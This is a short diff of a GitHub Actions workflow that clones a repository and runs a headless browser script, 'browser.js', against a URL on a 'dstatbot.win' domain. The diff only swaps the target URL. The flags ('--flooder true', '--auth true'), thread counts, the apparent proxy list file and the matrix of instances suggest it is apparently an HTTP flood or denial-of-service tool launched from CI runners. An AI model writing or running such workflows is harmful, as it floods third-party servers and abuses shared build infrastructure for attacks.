@@ -39,7 +39,7 @@ jobs:
         run: |
           git clone https://github.com/Fegp1p2/ideal-guide.git
           cd ideal-guide
-          xvfb-run -a node browser.js https://captcha.dstatbot.win/VA9Cy1QS 700 4 64 8.txt --debug true --flooder true --auth true
+          xvfb-run -a node browser.js https://captcha2.dstatbot.win/iJWzkdDm 700 4 64 8.txt --debug true --flooder true --auth true
           
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
